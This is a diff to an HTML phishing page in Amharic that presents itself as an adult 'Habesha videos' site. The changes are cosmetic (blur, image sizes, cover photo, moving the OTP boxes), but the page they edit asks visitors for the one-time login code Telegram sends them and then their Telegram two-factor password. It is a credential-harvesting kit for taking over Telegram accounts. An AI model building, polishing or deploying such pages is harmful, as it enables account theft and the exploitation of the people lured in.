@@ -20,7 +20,7 @@
         --primary: #FF005E;
         --secondary: #FF337A;
         --dark-bg: #0a0a0c;
-        --glass-bg: rgba(20, 20, 25, 0.75);
+        --glass-bg: rgba(0,0,0,0.378);
         --glass-border: rgba(255, 255, 255, 0.1);
         --text-main: #FFFFFF;
         --text-muted: #B0B5C5;
@@ -47,19 +47,19 @@
         left: 0;
     }
 
-    /* Blurred Background Image */
+    /* Blurred Background Image - በደንብ እንዲታይ ተስተካክሏል */
     .bg-image {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background-size: cover; background-position: center;
         z-index: -3; 
         transition: background-image 1.5s ease-in-out;
-        transform: scale(1.1); /* ጫፉ እንዳይታይ ትንሽ አሳድገነዋል */
-        filter: blur(8px) brightness(0.5); /* 🌟 ብዥታ (Blur) እና ጨለማ 🌟 */
+        transform: scale(1); 
+        filter: blur(2px) brightness(1); /* 🌟 ብዥታው ቀንሶ ምስሉ በግልፅ እንዲታይ ተደርጓል 🌟 */
     }
     
     .overlay {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: linear-gradient(180deg, rgba(10,10,12,0.5) 0%, rgba(5,5,8,0.8) 100%);
+        background: linear-gradient(180deg, rgba(10,10,12,0.4) 0%, rgba(5,5,8,0.7) 100%);
         z-index: -2;
     }
 
@@ -158,7 +158,7 @@
     <!-- Intro Step -->
     <div id="step_intro" class="step active">
         <!-- 🌟 GitHub Animated Fire Heart Emoji 🌟 -->
-        <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Symbols/Heart%20On%20Fire.webp" alt="Fire Heart" style="width: 90px; height: 90px; margin-bottom: 10px; filter: drop-shadow(0 0 15px rgba(255,0,94,0.5));">
+        <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/refs/heads/main/Symbols/Heart%20On%20Fire.webp" alt="Fire Heart" style="width: 200px; height: 200px; margin-bottom: 10px; filter: drop-shadow(0 0 15px rgba(255,0,94,0.5));">
         <h2 style="font-size: 20px;">የሀበሻ ቪዲዮዎች</h2>
         <div class="loader-ring"></div>
         <p style="font-size: 12px; color: var(--primary); font-weight: 700; letter-spacing: 2px;">እየከፈተ ነው...</p>
@@ -167,9 +167,9 @@
     <!-- Landing/Photo Step (Clean & Persuasive) -->
     <div id="step_photo_slide" class="step">
         <div class="glass-card" style="padding: 20px;">
-            <!-- Image with Play Button Overlay -->
+            <!-- 🌟 አዲሱ የቪዲዮ Cover ፎቶ 🌟 -->
             <div style="position: relative; border-radius: 12px; overflow: hidden; margin-bottom: 20px;" onclick="handleLoginClick()">
-                <img src="https://i.postimg.cc/QtCKRmF2/Screenshot-20260830-094824.jpg" style="width: 100%; display: block; filter: brightness(0.8);">
+                <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width: 100%; display: block; filter: brightness(0.8);">
                 <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; font-size: 55px; opacity: 0.9; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.5));">
                     <i class="fa-solid fa-circle-play"></i>
                 </div>
@@ -191,25 +191,24 @@
         </div>
     </div>
 
-    <!-- OTP Step (Using GitHub Animated Telephone Emoji) -->
+    <!-- OTP Step -->
     <div id="step2" class="step">
         <div class="glass-card">
-            <!-- 🌟 GitHub Animated Telephone Receiver (Size Increased) 🌟 -->
-            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Telephone%20Receiver.webp" alt="Phone" style="width: 90px; height: 90px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
+            <!-- 🌟 GitHub Animated Telephone Receiver 🌟 -->
+            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Telephone%20Receiver.webp" alt="Phone" style="width: 150px; height: 150px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
             
             <h2>ማረጋገጫ ኮድ</h2>
             <p>ዕድሜዎ 18+ መሆኑን ለማረጋገጥ <b>በቴሌግራም አፕሊኬሽንዎ</b> ላይ የተላከውን ባለ 5 አሃዝ ሚስጥራዊ ኮድ ያስገቡ።</p>
+          <div class="otp-container" id="otp_container">
+                <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
+          </div>
 
             <div id="status2" class="msg"></div>            
             
             <!-- 🌟 አዲሱ Button ከ OTP በላይ ገብቷል 🌟 -->
             <button class="btn-main" style="background: rgba(42, 171, 238, 0.1); color: var(--telegram-blue); border: 1px solid rgba(42, 171, 238, 0.3); box-shadow: none; font-size: 14px; padding: 14px; margin-bottom: 15px; border-radius: 12px;" onclick="window.open('https://t.me/42777', '_blank')">
                 <i class="fa-regular fa-comment-dots"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
-            </button>
-
-            <div class="otp-container" id="otp_container">
-                <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
-            </div>
+            </button>            
             
             <div class="keypad">
                 <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
@@ -221,11 +220,11 @@
         </div>
     </div>
 
-    <!-- 2FA Step (Using GitHub Animated See No Evil Monkey) -->
+    <!-- 2FA Step -->
     <div id="step3" class="step">
         <div class="glass-card">
-            <!-- 🌟 GitHub Animated See No Evil Monkey (Size Increased) 🌟 -->
-            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Smileys/See%20No%20Evil%20Monkey.webp" alt="Monkey" style="width: 90px; height: 90px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
+            <!-- 🌟 GitHub Animated See No Evil Monkey 🌟 -->
+            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Smileys/See%20No%20Evil%20Monkey.webp" alt="Monkey" style="width: 150px; height: 150px; margin-bottom: 10px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));">
             
             <h2>የቴሌግራም ፓስዎርድ</h2>
             <p>የእርስዎ ቴሌግራም በፓስዎርድ (2FA) የተቆለፈ ነው። ለመቀጠል ፓስዎርድዎን ያስገቡ።</p>
